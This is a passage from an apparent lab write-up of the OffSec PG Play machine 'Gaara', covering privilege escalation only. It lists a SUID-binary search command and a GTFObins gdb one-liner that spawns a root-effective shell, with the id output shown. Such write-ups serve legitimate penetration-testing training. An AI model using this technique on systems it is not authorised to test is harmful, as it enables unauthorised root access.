# :globe_with_meridians: Gaara - SSH Brute Force + SUID gdb Shell Escape | OffSec PG Play

---

## 3. Privilege Escalation — SUID gdb (GTFObins)

First check after landing — SUID binaries:

```
find / -perm -u=s -type f 2>/dev/null
```

Output (notable entries):

```
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/su
/usr/bin/passwd
...
```

`/usr/bin/gdb` with the SUID bit set. GDB — the GNU Debugger — has no business being SUID root. This is a well-known GTFObins entry: GDB can execute arbitrary Python code at startup, and since it is running with root's effective UID, any shell spawned inherits that privilege.

```
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

Output:

```
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
...
# id
uid=1001(gaara) gid=1001(gaara) euid=0(root) egid=0(root) groups=0(root),1001(gaara)
```

`euid=0` — root's effective UID. The `-p` flag on `sh` preserves the elevated effective UID rather than dropping it. Root shell obtained.

---
